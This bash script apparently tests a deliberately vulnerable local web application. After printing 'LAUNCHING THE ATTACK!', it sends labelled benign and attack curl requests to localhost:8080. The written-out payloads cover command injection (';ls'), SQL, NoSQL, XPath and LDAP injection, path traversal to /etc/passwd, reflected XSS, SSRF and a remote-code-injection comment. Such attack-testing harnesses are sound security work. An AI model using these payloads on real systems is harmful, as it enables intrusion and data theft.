#!/bin/bash
NONE='\033[00m'
GREEN='\033[01;32m'
RED='\033[01;31m'
BLUE='\033[0;34m'

for ((i=1;i<=30;i++));
do
   response=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/)
   if [[ $response -eq 200 ]]; then
     echo  -e "${BLUE}Application started ${NONE} \n"
     break
   fi
   echo -e "${BLUE}Waiting for Application to start...${NONE}"
   sleep 10
done

echo -e "${GREEN}Step 3: LAUNCHING THE ATTACK! ${NONE}"
echo -e "${GREEN}Firing curl request to execute attack ${NONE}"


if [[ ( $1 == "all" ) ]]; then
#$ Curl1 payload=google.com Pass None
curl 'http://localhost:8080/rce/attack?payload=google.com' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: connect.sid=s%3A6TNOdnOT0-BWbR0h94qqYlyn3gtLkWRs.1WDOQdbmeTYmkkyBNnIxXaQTmnNL%2B4O03gTAExuWL4U' --compressed
#^End

#$ Curl2 payload=google.com;ls Attack Remote-Code-Execution
curl 'http://localhost:8080/rce/attack?payload=google.com;ls' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: connect.sid=s%3A6TNOdnOT0-BWbR0h94qqYlyn3gtLkWRs.1WDOQdbmeTYmkkyBNnIxXaQTmnNL%2B4O03gTAExuWL4U' --compressed
#^End

#$ Curl3 email=admin&password=admin Pass None
curl -X POST http://localhost:8080/users/sqli -H 'accept: */*' -H 'cache-control: no-cache' -H 'content-type: application/x-www-form-urlencoded' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36' -d 'email=admin&password=admin'
#^End

#$ Curl4 email=admin'\''%20OR%20'\''1'\''%3D'\''1&password=-- Attack SQL-Injection
curl -X POST http://localhost:8080/users/sqli -H 'accept: */*' -H 'cache-control: no-cache' -H 'content-type: application/x-www-form-urlencoded' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36' -d 'email=admin'\''%20OR%20'\''1'\''%3D'\''1&password=--'
#^End

#$ Curl5 payload=sample.js Pass None
curl 'http://localhost:8080/fileread/attack?payload=sample.js' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"1a94-mLlqJZ159FfGGd+0tZSfA/nuDpE"' --compressed
#^End

#$ Curl6 payload=../../etc/passwd Attack File-Access
curl 'http://localhost:8080/fileread/attack?payload=../../etc/passwd' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"1a94-mLlqJZ159FfGGd+0tZSfA/nuDpE"' --compressed
#^End

#$ Curl7 payload=sample.js Pass None
curl 'http://localhost:8080/fileread/async/attack?payload=sample.js' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"1a94-mLlqJZ159FfGGd+0tZSfA/nuDpE"' --compressed
#^End

#$ Curl8 payload=/etc/passwd Attack File-Access
curl 'http://localhost:8080/fileread/async/attack?payload=../..//etc/passwd' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"1a94-mLlqJZ159FfGGd+0tZSfA/nuDpE"' --compressed
#^End

#$ Curl9 payload=/tmp/foo.txt Attack File-Access
curl 'http://localhost:8080/filewrite/attack?payload=/tmp/foo.txt' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"16-FQYY7Ouv7Kb8sRqBOn04+T2YpGA"' --compressed
#^End

#$ Curl10 payload=/tmp/foo.txt Attack File-Access
curl 'http://localhost:8080/filewrite/async/attack?payload=/tmp/foo.txt' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"16-FQYY7Ouv7Kb8sRqBOn04+T2YpGA"' --compressed
#^End

#$ Curl11 payload=sample.js Attack Application-Integrity-Violation
curl 'http://localhost:8080/fileintegrity/attack?payload=sample.js' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"1a-UmlUIZIN1EyBrQBS1pnKsZi5lw0"' --compressed
#^End

#$ Curl12 payload=sample.js Attack Application-Integrity-Violation
curl 'http://localhost:8080/fileintegrity/async/attack?payload=sample.js' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' -H 'If-None-Match: W/"1a-UmlUIZIN1EyBrQBS1pnKsZi5lw0"' --compressed
#^End

#$ Curl13 payload=test Pass None
curl 'http://localhost:8080/rxss?payload=test' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl14 payload=%3Cscript%3Ealert(%22Hacked%22)%3C/script%3E Attack Reflected-XSS
curl 'http://localhost:8080/rxss?payload=%3Cscript%3Ealert(%22Hacked%22)%3C/script%3E' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl15 first_name=asdrwds&last_name=sadsfdes&email=abcd@gmail.com&password=aadsfad Pass None
curl -X POST http://localhost:8080/sxss -H 'accept: */*' -H 'cache-control: no-cache' -H 'content-type: application/x-www-form-urlencoded' -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36' -d'first_name=asdrwds&last_name=sadsfdes&email=abcd@gmail.com&password=aadsfad'
#^End

#$ Curl16 payload=localhost:8080 Pass None
curl 'http://localhost:8080/ssrf/request?payload=http://localhost:8080' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl17 payload=google.com Attack SSRF
curl 'http://localhost:8080/ssrf/request?payload=http://google.com' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl18 payload=localhost:8080 Pass None
curl 'http://localhost:8080/ssrf/axios?payload=http://localhost:8080' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl19 payload=google.com Attack SSRF
curl 'http://localhost:8080/ssrf/axios?payload=http://facebook.com' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl20 payload=localhost:8080 Pass None
curl 'http://localhost:8080/ssrf/https/request?payload=https://localhost:8080' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl21 payload=google.com Attack SSRF
curl 'http://localhost:8080/ssrf/https/request?payload=https://google.com' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl22 {"type":"fairy"} Pass None
curl -XPOST -H 'attack: true' -H 'Content-type: application/json' -d '{"type":"fairy"}' 'http://localhost:8080/nosqli/mongo'
#^End

#$ Curl23 {"type":{"$gte":""}} Attack NoSQL-Injection
curl -XPOST -H 'attack: true' -H 'Content-type: application/json' -d '{"type":{"$gte":""}}' 'http://localhost:8080/nosqli/mongo'
#^End

#$ Curl24 username=admin&password=xpath Pass None
curl 'http://localhost:8080/xpath' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://localhost:8080' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Referer: http://localhost:8080/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' --data 'username=admin&password=xpath' --compressed --insecure
#^End

#$ Curl25 username=%27+or+%271%27%3D%271&password=%27+or+%271%27%3D%271 Attack XPath-Injection
curl 'http://localhost:8080/xpath' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://localhost:8080' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Referer: http://localhost:8080/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' --data 'username=%27+or+%271%27%3D%271&password=%27+or+%271%27%3D%271' --compressed --insecure
#^End

#$ Curl26 username=test Pass None
curl 'http://localhost:8080/ldap' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://localhost:8080' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Referer: http://localhost:8080/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' --data 'username=test' --compressed --insecure
#^End

#$ Curl27 username=*%29%28uid%3D* Attack LDAP-Injection
curl 'http://localhost:8080/ldap' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://localhost:8080' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Referer: http://localhost:8080/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' --data 'username=*%29%28uid%3D*' --compressed --insecure
#^End

#$ Curl28 payload=../syscall_node/index.js Attack Import-File-Operation
curl 'http://localhost:8080/pathTraversal/import?payload=../syscall_node/index.js' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"' -H 'sec-ch-ua-mobile: ?0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en;q=0.9' -H 'Cookie: connect.sid=s%3AB5ME1PlT6JRmnqzI0S_KPk4JVdbd5U73.%2BAj0Eu6nUguTRn%2FHyTlhl6wYV2luH0vjN3ypKzF4pkI' --compressed
#^End
 
#$ Curl29 payload=require(%27http%27).get(%27http://google.com%27,%20function(r)\{console.log(43);\}); Attack Remote-Code-Injection
